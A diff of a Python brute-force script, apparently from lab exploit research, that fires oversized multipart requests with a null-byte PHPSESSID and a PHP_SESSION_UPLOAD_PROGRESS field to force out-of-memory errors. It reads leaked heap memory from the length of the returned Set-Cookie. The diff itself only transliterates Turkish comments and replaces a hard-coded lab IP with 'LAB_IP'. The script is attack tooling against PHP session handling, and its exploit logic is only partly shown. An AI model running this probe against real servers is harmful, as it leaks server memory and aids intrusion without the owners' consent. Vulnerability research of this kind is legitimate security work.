@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """SIMPLE brute force — tek parametre, tek istek, en basit sinyal.
 
-Karmaşık eness/9bie zinciri yerine:
-  * TEK OOM isteği (field size vary)
-  * AYRI leak read YOK — OOM isteğinin KENDİSİNİN Set-Cookie'sine bak
+Karmasik eness/9bie zinciri yerine:
+  * TEK OOM istegi (field size vary)
+  * AYRI leak read YOK — OOM isteginin KENDISININ Set-Cookie'sine bak
   * Sinyal: Set-Cookie decoded length (32B=clean, >32B=heap leak)
 
-Hızlı iterasyon için her adım <1s.
+Hizli iterasyon icin her adim <1s.
 
 Usage:
   python3 bf_simple.py --port 18113 --sizes 1,2,4,8,16,32,64,128,256
@@ -20,7 +20,7 @@ from common import (Target, build_multipart, parse_cookie,
 
 
 def fire_oom(t: Target, size_mb: int, boundary: bytes) -> tuple[int, bytes]:
-    """Tek OOM isteği: 1 büyük field. Set-Cookie'yi döndür."""
+    """Tek OOM istegi: 1 buyuk field. Set-Cookie'yi dondur."""
     parts = [
         {"name": "PHPSESSID", "data": b"\x00"},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
@@ -32,7 +32,7 @@ def fire_oom(t: Target, size_mb: int, boundary: bytes) -> tuple[int, bytes]:
 
 def main() -> int:
     ap = argparse.ArgumentParser()
-    ap.add_argument("--host", default="192.168.8.123")
+    ap.add_argument("--host", default="LAB_IP")
     ap.add_argument("--port", type=int, default=18113)
     ap.add_argument("--sizes", default="1,2,4,8,16,32,64,128,256",
                     help="comma-separated field sizes in MB")
